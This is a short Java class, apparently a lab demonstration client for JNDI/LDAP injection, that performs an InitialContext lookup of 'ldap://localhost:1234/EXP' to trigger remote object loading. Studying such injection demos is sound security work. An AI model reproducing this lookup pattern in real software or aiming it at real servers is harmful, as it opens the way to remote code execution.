package Client;

import javax.naming.Context;
import javax.naming.InitialContext;

public class LDAPDeserializeClient {
    public static void main(String[] args) throws Exception {
        // lookup参数注入触发
        Context context = new InitialContext();
        context.lookup("ldap://localhost:1234/EXP");

    }
}